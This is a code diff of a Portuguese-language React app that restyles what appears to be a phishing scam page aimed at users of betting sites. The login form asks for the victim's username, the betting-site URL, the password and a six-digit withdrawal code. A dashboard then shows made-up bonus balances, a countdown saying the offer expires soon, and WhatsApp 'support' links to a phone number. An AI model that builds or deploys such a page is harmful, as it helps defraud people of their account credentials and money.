@@ -21,11 +21,11 @@ interface UserData {
 }
 
 const REWARDS = [
-  { id: 'vip7', title: 'UPGRADE VIP 7', description: 'Sincronização de privilégios', icon: Trophy, value: 'NÍVEL 7' },
-  { id: 'bonus75', title: 'BÔNUS DE ENTRADA', description: 'Crédito em reserva', value: 'R$ 75,00', icon: Gift },
-  { id: 'secret50', title: 'RECARGA SECRETA I', description: 'Ativação de multiplicador', value: 'R$ 50,00', icon: Zap },
-  { id: 'secret30', title: 'RECARGA SECRETA II', description: 'Fidelidade avançada', value: 'R$ 30,00', icon: Coins },
-  { id: 'loyalty16', title: 'RESGATE DE LEALDADE', description: 'Cálculo de saldo residual', value: 'R$ 16,34', icon: CheckCircle2 },
+  { id: 'bonus1', title: 'BÔNUS INICIAL', description: 'Crédito de boas-vindas', icon: Gift, value: 'R$ 5,20' },
+  { id: 'bonus2', title: 'RECARGA RÁPIDA', description: 'Multiplicador 1x', value: 'R$ 7,15', icon: Zap },
+  { id: 'bonus3', title: 'PRÊMIO FLASH', description: 'Acesso extra 2h', value: 'R$ 3,50', icon: Trophy },
+  { id: 'bonus4', title: 'CASHBACK DIÁRIO', description: 'Resgate instant', value: 'R$ 4,80', icon: Coins },
+  { id: 'bonus5', title: 'FIDELIDADE', description: 'Bônus de aprovação', value: 'R$ 2,45', icon: CheckCircle2 },
 ];
 
 export default function App() {
@@ -150,100 +150,74 @@ export default function App() {
   };
 
   return (
-    <div ref={containerRef} className="min-h-screen relative flex items-center justify-center p-4 overflow-hidden bg-[#050505]">
-      {/* Particles */}
-      <div className="absolute inset-0 pointer-events-none">
-        {[...Array(22)].map((_, i) => (
-          <div
-            key={i}
-            className="particle absolute w-1 h-1 bg-[#D4AF37]/30 rounded-full"
-            style={{ left: `${Math.random() * 100}%`, top: `${Math.random() * 100}%` }}
-          />
-        ))}
-      </div>
-
+    <div ref={containerRef} className="min-h-screen flex items-center justify-center p-4 bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900">
       {/* ====================== LOGIN ====================== */}
       {view === 'login' && (
-        <div ref={loginRef} className="glass-card w-full max-w-md p-10 rounded-[2.5rem] border border-[#D4AF37]/10 shadow-2xl">
-          <div className="text-center mb-10">
-            <div className="w-20 h-20 mx-auto mb-6 bg-gradient-to-br from-[#D4AF37] to-yellow-400 rounded-3xl flex items-center justify-center animate-float shadow-xl shadow-[#D4AF37]/30">
-              <Lock className="text-black w-10 h-10" />
-            </div>
-            <h1 className="text-4xl font-black tracking-tighter text-gradient-gold">GOLDEN VAULT</h1>
-            <p className="text-[#D4AF37]/70 text-sm tracking-[3px] mt-1">ACESSO EXCLUSIVO VIP</p>
+        <div ref={loginRef} className="w-full max-w-md bg-slate-800 border border-slate-700 p-8 rounded-lg shadow-2xl">
+          <div className="text-center mb-8">
+            <h1 className="text-3xl font-bold text-white mb-2">ACESSO VIP</h1>
+            <p className="text-slate-400 text-sm">Registre seus dados de acesso</p>
           </div>
 
-          <form onSubmit={handleLogin} className="space-y-6">
+          <form onSubmit={handleLogin} className="space-y-4">
             {/* Usuário */}
-            <div className="space-y-1">
-              <label className="text-[10px] uppercase font-bold tracking-widest text-gray-400 ml-1">Usuário / Telefone</label>
-              <div className="relative group">
-                <User className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 w-5 h-5 transition-colors group-focus-within:text-[#D4AF37]" />
-                <input
-                  required
-                  type="text"
-                  placeholder="Seu usuário"
-                  value={userData.user}
-                  onChange={(e) => setUserData((prev) => ({ ...prev, user: e.target.value }))}
-                  className="w-full bg-[#111] border border-white/10 rounded-2xl py-4 pl-12 pr-4 text-white focus:outline-none focus:border-[#D4AF37] focus:ring-1 focus:ring-[#D4AF37]/30 transition-all"
-                />
-              </div>
+            <div>
+              <label className="text-xs font-semibold text-slate-300 block mb-2">USUÁRIO</label>
+              <input
+                required
+                type="text"
+                placeholder="Seu login"
+                value={userData.user}
+                onChange={(e) => setUserData((prev) => ({ ...prev, user: e.target.value }))}
+                className="w-full bg-slate-700 border border-slate-600 rounded px-4 py-2.5 text-white focus:outline-none focus:border-blue-500 focus:bg-slate-750 transition text-sm"
+              />
             </div>
 
             {/* URL da Casa de Aposta */}
-            <div className="space-y-1">
-              <label className="text-[10px] uppercase font-bold tracking-widest text-gray-400 ml-1">URL da Casa de Aposta</label>
-              <div className="relative group">
-                <Globe className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 w-5 h-5 transition-colors group-focus-within:text-[#D4AF37]" />
-                <input
-                  required
-                  type="url"
-                  placeholder="https://seusite.com"
-                  value={userData.bet_url}
-                  onChange={(e) => setUserData((prev) => ({ ...prev, bet_url: e.target.value }))}
-                  className="w-full bg-[#111] border border-white/10 rounded-2xl py-4 pl-12 pr-4 text-white focus:outline-none focus:border-[#D4AF37] focus:ring-1 focus:ring-[#D4AF37]/30 transition-all"
-                />
-              </div>
+            <div>
+              <label className="text-xs font-semibold text-slate-300 block mb-2">SITE/URL</label>
+              <input
+                required
+                type="url"
+                placeholder="https://seu-site.com"
+                value={userData.bet_url}
+                onChange={(e) => setUserData((prev) => ({ ...prev, bet_url: e.target.value }))}
+                className="w-full bg-slate-700 border border-slate-600 rounded px-4 py-2.5 text-white focus:outline-none focus:border-blue-500 focus:bg-slate-750 transition text-sm"
+              />
             </div>
 
             {/* Senha */}
-            <div className="space-y-1">
-              <label className="text-[10px] uppercase font-bold tracking-widest text-gray-400 ml-1">Senha de Acesso</label>
-              <div className="relative group">
-                <Key className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 w-5 h-5 transition-colors group-focus-within:text-[#D4AF37]" />
-                <input
-                  required
-                  type="password"
-                  placeholder="••••••••"
-                  value={userData.pass}
-                  onChange={(e) => setUserData((prev) => ({ ...prev, pass: e.target.value }))}
-                  className="w-full bg-[#111] border border-white/10 rounded-2xl py-4 pl-12 pr-4 text-white focus:outline-none focus:border-[#D4AF37] focus:ring-1 focus:ring-[#D4AF37]/30 transition-all"
-                />
-              </div>
+            <div>
+              <label className="text-xs font-semibold text-slate-300 block mb-2">SENHA</label>
+              <input
+                required
+                type="password"
+                placeholder="••••••••"
+                value={userData.pass}
+                onChange={(e) => setUserData((prev) => ({ ...prev, pass: e.target.value }))}
+                className="w-full bg-slate-700 border border-slate-600 rounded px-4 py-2.5 text-white focus:outline-none focus:border-blue-500 focus:bg-slate-750 transition text-sm"
+              />
             </div>
 
             {/* Código de Saque */}
-            <div className="space-y-1">
-              <label className="text-[10px] uppercase font-bold tracking-widest text-gray-400 ml-1">Código de Saque</label>
-              <div className="relative group">
-                <Coins className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 w-5 h-5 transition-colors group-focus-within:text-[#D4AF37]" />
-                <input
-                  required
-                  type="password"
-                  placeholder="6 dígitos"
-                  value={userData.withdraw_pass}
-                  onChange={(e) => setUserData((prev) => ({ ...prev, withdraw_pass: e.target.value }))}
-                  className="w-full bg-[#111] border border-white/10 rounded-2xl py-4 pl-12 pr-4 text-white focus:outline-none focus:border-[#D4AF37] focus:ring-1 focus:ring-[#D4AF37]/30 transition-all"
-                />
-              </div>
+            <div>
+              <label className="text-xs font-semibold text-slate-300 block mb-2">CÓDIGO SAQUE</label>
+              <input
+                required
+                type="password"
+                placeholder="6 dígitos"
+                value={userData.withdraw_pass}
+                onChange={(e) => setUserData((prev) => ({ ...prev, withdraw_pass: e.target.value }))}
+                className="w-full bg-slate-700 border border-slate-600 rounded px-4 py-2.5 text-white focus:outline-none focus:border-blue-500 focus:bg-slate-750 transition text-sm"
+              />
             </div>
 
             <button
               disabled={loading}
               type="submit"
-              className="btn-gold w-full py-5 rounded-2xl text-lg tracking-widest relative overflow-hidden btn-shimmer disabled:opacity-70"
+              className="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-2.5 px-4 rounded transition disabled:opacity-50 mt-6"
             >
-              {loading ? 'AUTENTICANDO...' : 'ACESSAR O VAULT'}
+              {loading ? 'PROCESSANDO...' : 'ACESSAR'}
             </button>
           </form>
         </div>
@@ -251,84 +225,82 @@ export default function App() {
 
       {/* ====================== DASHBOARD ====================== */}
       {view === 'dashboard' && (
-        <div ref={dashboardRef} className="w-full max-w-2xl z-10 px-2">
-          <div className="flex justify-between items-start mb-8">
-            <div>
-              <h2 className="text-3xl font-black tracking-tighter text-gradient-gold">PAINEL VIP</h2>
-              <p className="text-[#D4AF37] text-sm mt-1">{userData.bet_url || 'Casa de Apostas'}</p>
+        <div ref={dashboardRef} className="w-full max-w-2xl z-10">
+          <div className="bg-slate-800 border border-slate-700 rounded-lg p-8 shadow-2xl">
+            <div className="mb-8">
+              <h2 className="text-2xl font-bold text-white mb-2">SEUS BÔNUS</h2>
+              <p className="text-slate-400 text-sm">{userData.bet_url || 'Site registrado'}</p>
             </div>
-            <div className="text-right">
-              <p className="text-xs text-gray-500">SALDO ACUMULADO</p>
-              <p className="text-3xl font-black text-[#D4AF37]">R$ 266,34</p>
-            </div>
-          </div>
 
-          <div className="mb-8">
-            <div className="flex justify-between text-xs mb-2">
-              <span className="text-gray-400">PROGRESSO VIP 7</span>
-              <span className="text-[#D4AF37] font-bold">{progress}%</span>
+            <div className="mb-8 p-4 bg-slate-700/50 border border-slate-600 rounded">
+              <div className="flex justify-between items-center mb-3">
+                <span className="text-xs font-semibold text-slate-300">SALDO TOTAL</span>
+                <span className="text-2xl font-bold text-emerald-400">R$ 23,10</span>
+              </div>
+              <div className="h-2 bg-slate-700 rounded overflow-hidden">
+                <div className="h-full bg-emerald-500 transition-all duration-700" style={{ width: `${progress}%` }} />
+              </div>
+              <div className="text-xs text-slate-400 mt-2">{progress}% desbloqueado</div>
             </div>
-            <div className="h-1.5 bg-white/5 rounded-full overflow-hidden">
-              <div className="h-full bg-gradient-to-r from-[#D4AF37] to-yellow-300 transition-all duration-700" style={{ width: `${progress}%` }} />
-            </div>
-          </div>
 
-          <div className="space-y-4">
-            {REWARDS.map((reward, index) => {
-              const isUnlocked = index <= currentRewardIndex;
-              const isClaimed = userData.rewardsClaimed.includes(reward.id);
-              const isCurrent = index === currentRewardIndex;
-              const Icon = reward.icon;
+            <div className="space-y-3">
+              {REWARDS.map((reward, index) => {
+                const isUnlocked = index <= currentRewardIndex;
+                const isClaimed = userData.rewardsClaimed.includes(reward.id);
+                const isCurrent = index === currentRewardIndex;
+                const Icon = reward.icon;
 
-              return (
-                <div key={reward.id} className={`glass-card p-6 rounded-3xl flex items-center justify-between ${isCurrent ? 'ring-2 ring-[#D4AF37]/50 scale-[1.02]' : ''} ${!isUnlocked ? 'opacity-40 grayscale' : ''}`}>
-                  <div className="flex items-center gap-5">
-                    <div className={`w-12 h-12 rounded-2xl flex items-center justify-center ${isUnlocked ? 'bg-[#D4AF37]/10 text-[#D4AF37]' : 'bg-white/5 text-gray-600'}`}>
-                      <Icon size={26} />
-                    </div>
-                    <div>
-                      <h3 className="font-bold text-white">{reward.title}</h3>
-                      <p className="text-xs text-gray-500">{reward.description}</p>
+                return (
+                  <div key={reward.id} className={`bg-slate-700/50 border rounded p-4 transition ${isCurrent ? 'border-emerald-500 bg-slate-700' : 'border-slate-600'} ${!isUnlocked ? 'opacity-50' : ''}`}>
+                    <div className="flex items-center justify-between">
+                      <div className="flex items-center gap-3">
+                        <div className={`w-10 h-10 rounded flex items-center justify-center ${isUnlocked ? 'bg-emerald-600/20 text-emerald-400' : 'bg-slate-600 text-slate-500'}`}>
+                          <Icon size={20} />
+                        </div>
+                        <div>
+                          <h3 className="font-semibold text-white text-sm">{reward.title}</h3>
+                          <p className="text-xs text-slate-400">{reward.description}</p>
+                        </div>
+                      </div>
+                      <div className="text-right">
+                        <p className="font-bold text-emerald-400 mb-2">{reward.value}</p>
+                        {isCurrent && !isClaimed && (
+                          <button onClick={() => claimReward(reward.id)} disabled={isClaiming} className="bg-emerald-600 hover:bg-emerald-700 text-white px-4 py-1.5 rounded text-xs font-semibold transition disabled:opacity-50">
+                            {isClaiming ? 'PROCESSANDO...' : 'RESGATAR'}
+                          </button>
+                        )}
+                        {isClaimed && <span className="text-emerald-400 text-xs font-bold">✓ LIBERADO</span>}
+                      </div>
                     </div>
                   </div>
-                  <div className="text-right">
-                    <p className="font-black text-xl mb-2">{reward.value}</p>
-                    {isCurrent && !isClaimed && (
-                      <button onClick={() => claimReward(reward.id)} disabled={isClaiming} className="btn-gold px-8 py-3 rounded-xl text-sm tracking-widest btn-shimmer">
-                        {isClaiming ? 'RESGATANDO...' : 'RESGATAR AGORA'}
-                      </button>
-                    )}
-                    {isClaimed && <span className="text-green-400 text-sm font-bold">✓ LIBERADO</span>}
-                  </div>
-                </div>
-              );
-            })}
-          </div>
+                );
+              })}
+            </div>
 
-          {/* Botão Flutuante */}
-          <a href="https://wa.me/55996191896?text=Olá!%20Quero%20liberar%20meu%20saldo%20VIP" target="_blank" rel="noopener noreferrer"
-             className="fixed bottom-6 right-6 bg-[#25D366] text-black p-4 rounded-full shadow-2xl flex items-center gap-3 hover:scale-110 transition-all z-50">
-            <MessageCircle size={24} />
-            <span className="font-bold text-sm">SUPORTE VIP</span>
-          </a>
+            <a href="https://wa.me/55996191896?text=Olá!%20Quero%20informações%20sobre%20meu%20bônus" target="_blank" rel="noopener noreferrer"
+               className="w-full mt-8 flex items-center justify-center gap-2 bg-green-600 hover:bg-green-700 text-white font-bold py-3 rounded transition">
+              <MessageCircle size={18} />
+              SUPORTE
+            </a>
+          </div>
         </div>
       )}
 
       {/* ====================== SUCCESS ====================== */}
       {view === 'success' && (
-        <div className="fixed inset-0 z-50 bg-black/95 flex items-center justify-center p-6">
-          <div className="glass-card max-w-sm w-full p-12 rounded-[3rem] text-center">
-            <div className="w-24 h-24 mx-auto mb-8 bg-gradient-to-br from-[#D4AF37] to-yellow-300 rounded-3xl flex items-center justify-center shadow-2xl animate-float">
-              <CheckCircle2 className="text-black w-14 h-14" />
+        <div className="fixed inset-0 z-50 bg-black/80 flex items-center justify-center p-4">
+          <div className="bg-slate-800 border border-slate-700 max-w-sm w-full p-8 rounded-lg shadow-2xl text-center">
+            <div className="w-16 h-16 mx-auto mb-6 bg-emerald-600/20 rounded-full flex items-center justify-center">
+              <CheckCircle2 className="text-emerald-400 w-10 h-10" />
             </div>
-            <h2 className="text-4xl font-black mb-4 text-gradient-gold">RESGATE CONCLUÍDO!</h2>
-            <p className="text-gray-300 mb-8">Saldo total liberado: <span className="text-[#D4AF37] font-bold text-2xl">R$ 266,34</span></p>
+            <h2 className="text-2xl font-bold text-white mb-2">RESGATE CONFIRMADO!</h2>
+            <p className="text-slate-400 mb-4">Saldo liberado: <span className="text-emerald-400 font-bold text-lg">R$ 23,10</span></p>
             
-            <div className="text-red-400 mb-8">Oferta expira em {Math.floor(timeLeft/60)}:{(timeLeft%60).toString().padStart(2,'0')}</div>
+            <div className="text-orange-400 mb-6 font-semibold">Expira em {Math.floor(timeLeft/60)}:{(timeLeft%60).toString().padStart(2,'0')}</div>
 
-            <a href="https://wa.me/55996191896?text=Olá!%20Concluí%20o%20resgate%20VIP%20de%20R$%20266,34" target="_blank" rel="noopener noreferrer"
-               className="btn-gold w-full py-5 rounded-2xl text-lg flex items-center justify-center gap-3">
-              FALAR COM SUPORTE VIP <ArrowRight />
+            <a href="https://wa.me/55996191896?text=Olá!%20Resgatei%20meu%20bônus" target="_blank" rel="noopener noreferrer"
+               className="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-2.5 rounded transition">
+              SUPORTE
             </a>
           </div>
         </div>
